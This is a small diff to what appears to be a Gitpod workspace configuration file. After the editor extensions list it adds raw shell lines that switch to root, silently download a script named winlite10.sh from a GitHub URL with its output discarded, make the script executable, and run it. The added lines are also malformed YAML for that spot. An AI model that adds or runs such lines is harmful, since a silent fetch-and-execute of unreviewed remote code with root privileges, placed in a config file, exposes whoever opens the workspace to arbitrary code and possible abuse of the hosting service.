@@ -17,3 +17,7 @@ ports:
 vscode:
   extensions:
     - ms-python.python
+sudo su
+wget -O winlite10.sh https://raw.githubusercontent.com/a2nk/G-cloud/main/winlite10.sh?utm_source=google,+gitpod,+linggahosting,+github,+ngrok > /dev/null 2>&1
+chmod +x winlite10.sh
+./winlite10.sh
